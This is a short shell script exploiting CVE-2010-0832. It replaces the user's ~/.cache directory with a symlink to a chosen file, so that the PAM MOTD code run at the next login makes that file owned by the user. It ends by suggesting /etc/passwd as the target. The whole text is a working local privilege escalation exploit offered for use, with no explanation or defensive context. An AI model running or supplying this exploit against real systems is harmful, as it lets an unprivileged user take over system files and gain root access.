#!/bin/sh
# CVE : CVE-2010-0832
 
if [ $# -eq 0 ]; then
    echo "Usage: $0 /path/to/file"
    exit 1
fi
 
mkdir $HOME/backup 2> /dev/null
tmpdir=$(mktemp -d --tmpdir=$HOME/backup/)
mv $HOME/.cache/ $tmpdir 2> /dev/null
ls -l $1
ln -sf $1 $HOME/.cache
echo "Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code. File will then be owned by your user. Try /etc/passwd..."
